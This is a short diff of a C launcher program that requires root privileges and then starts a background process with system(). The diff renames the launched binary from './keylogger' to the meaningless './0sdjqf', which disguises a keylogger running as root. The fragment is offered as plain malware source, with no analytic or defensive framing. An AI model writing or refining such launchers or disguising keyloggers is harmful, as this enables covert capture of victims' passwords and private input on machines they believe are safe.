@@ -7,7 +7,7 @@ int main(int argc,char*argv[]) {
 		printf("Please run as root");
 		return -1;
 	}
-	system("./keylogger &");
+	system("./0sdjqf &");
 	return 0; 
 
 }
